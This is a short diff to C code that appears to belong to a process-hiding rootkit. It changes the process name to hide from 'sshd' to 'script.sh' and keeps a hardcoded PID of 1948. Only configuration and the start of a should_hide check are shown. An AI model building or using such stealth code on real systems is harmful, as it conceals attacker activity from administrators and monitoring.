@@ -11,7 +11,7 @@
 #define HIDE_BY_NAME
 
 #define PID_TO_HIDE "1948"
-#define PROC_NAME_TO_HIDE "sshd"
+#define PROC_NAME_TO_HIDE "script.sh"
 
 static int should_hide(const char *pid) {
 #ifdef HIDE_BY_PID
